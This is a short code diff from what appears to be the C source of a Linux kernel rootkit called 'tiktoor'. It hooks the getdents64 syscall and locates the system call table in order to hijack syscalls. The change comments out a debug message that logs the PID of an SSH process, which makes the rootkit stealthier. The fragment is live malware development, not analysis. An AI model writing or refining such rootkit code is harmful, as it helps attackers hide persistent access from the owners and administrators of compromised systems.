@@ -83,7 +83,7 @@ static asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dir
  *              versions.
  ***************************************************************************/
 void init_filesystem_hook() {
-  printk(KERN_ALERT "[tiktoor] SSH PID: %s", ssh_pid);
+  //printk(KERN_ALERT "[tiktoor] SSH PID: %s", ssh_pid);
   sys_call_table = (unsigned long *)getTableAddress();
 
   if(sys_call_table == NULL)
